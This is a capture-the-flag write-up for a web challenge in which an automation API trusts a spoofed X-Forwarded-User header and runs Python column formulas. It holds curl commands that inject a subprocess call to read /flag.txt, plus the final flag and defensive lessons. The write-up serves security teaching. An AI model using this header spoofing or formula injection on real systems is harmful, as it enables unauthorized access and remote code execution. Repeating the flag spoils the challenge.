# Trust Fall

## Category
Web

## Difficulty
Easy

## Challenge Description

Korvia operates an internal operations platform used by Directorate 9 to stage and coordinate infrastructure attacks against election systems. Gilded Weaver analysts rely on it as a key node before the blackout, and Task Force Nightfall has been authorized to hack back. You are tasked to breach D9's staging platform, seize access to the internal operator workspace, and extract intelligence before the election is derailed.

**Creator:** Xclow3n

## Summary
A Grist document automation API trusts the `X-Forwarded-User` header for authentication without
any cryptographic verification. A formula injection in a Grist table column executes arbitrary
Python on the server via a subprocess call, leaking the flag file.

## Provided Files
None (Docker instance only)

## Tools Used
- curl

## Walkthrough

**Authentication bypass:**

The API accepts `X-Forwarded-User` as the authenticated user identity without signature or
token validation. Any client can impersonate any user by setting this header to a known
username.

**Formula injection:**

Grist column formulas are evaluated as Python in the server process with no sandbox. Adding a
computed column with a formula containing `subprocess.check_output` executes arbitrary commands
as the server process.

**Step 1: add a computed column that reads the flag**

```bash
curl -s -X POST \
  http://<target-ip>:<target-port>/api/docs/automation-lab/apply \
  -H "X-Forwarded-User: alex.caldwell@grist.htb" \
  -H "Content-Type: application/json" \
  -d '[["AddColumn","Runbook","Flag",{"formula":"import subprocess; subprocess.check_output([\"cat\",\"/flag.txt\"]).decode()","isFormula":true}]]'
```

**Step 2: retrieve the computed flag value from the table**

```bash
curl -s \
  http://<target-ip>:<target-port>/api/docs/automation-lab/tables/Runbook/records \
  -H "X-Forwarded-User: alex.caldwell@grist.htb"
```

The flag appears in the `Flag` field of each returned record.

## Key Findings

- `X-Forwarded-User` is trusted without any cryptographic verification; any external client can
  set it to an arbitrary value
- Grist formula columns execute arbitrary Python in the server process; there is no sandbox or
  allowlist restricting available modules
- The flag is accessible via a one-line subprocess call inside the formula
- No authentication token, session cookie, or API key is required at any step

## Final Answer

`Flag: HTB{d9_pr0xy_tru5t_5h4tt3r3d_3e78bdd80be300ffb23208c812393ef0}`

## Lessons Learned

Proxy authentication headers (`X-Forwarded-User`, `X-Forwarded-For`) must never be trusted
when they can be set by external clients. These headers are only safe when the application is
placed behind a reverse proxy that strips and re-adds them, with the application bound to
localhost so direct access is impossible. Spreadsheet formula engines that expose general-purpose
scripting languages (Python, JavaScript) require strong sandboxing, module allowlisting, or
process isolation to prevent remote code execution via column formulas.
